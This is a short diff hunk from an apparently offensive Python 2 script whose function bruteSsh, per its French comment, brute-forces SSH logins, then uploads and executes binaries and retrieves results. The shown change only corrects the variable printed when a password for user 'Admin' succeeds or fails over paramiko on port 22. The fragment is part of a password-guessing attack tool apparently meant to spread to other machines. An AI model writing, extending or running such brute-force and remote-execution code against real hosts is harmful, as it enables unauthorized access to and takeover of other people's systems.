@@ -51,9 +51,9 @@ def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupérati
 			
 		try:
 			ssh.connect(ip,port=22,username="Admin",password=password)
-			print "[*] SSH IP: %s Password found: %s\n" % (current_target,password)
+			print "[*] SSH IP: %s Password found: %s\n" % (ip,password)
 		except paramiko.AuthenticationException:
-			print "[*] SSH IP: %s Password failed: %s" % (current_target,password)
+			print "[*] SSH IP: %s Password failed: %s" % (ip,password)
 			continue
 			
 		try:
